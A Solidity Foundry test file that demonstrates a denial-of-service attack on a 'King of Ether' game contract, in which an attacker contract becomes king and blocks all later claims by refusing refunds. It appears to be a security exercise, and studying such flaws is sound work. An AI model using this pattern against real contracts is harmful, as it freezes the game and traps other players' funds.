// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/King0fEther.sol";

contract KingOfEtherTest is Test {
    KingOfEther public game;
    Attack public attacker;
    address alice = address(0x1);
    address bob = address(0x2);

    function setUp() public {
        game = new KingOfEther();
    }

    function test_DoS_Attack() public {
        // Alice becomes king with 1 ether
        vm.deal(alice, 1 ether);
        vm.prank(alice);
        game.claimThrone{value: 1 ether}();

        // Bob becomes king with 2 ether
        vm.deal(bob, 2 ether);
        vm.prank(bob);
        game.claimThrone{value: 2 ether}();

        // Deploy attacker and become king with 3 ether
        attacker = new Attack(game);
        vm.deal(address(attacker), 3 ether);
        attacker.attack{value: 3 ether}();

        // Now any new claim will fail due to DoS
        vm.deal(alice, 4 ether);
        vm.prank(alice);
        vm.expectRevert(); // Transaction will fail because attacker won't accept refund
        game.claimThrone{value: 4 ether}();
    }
}
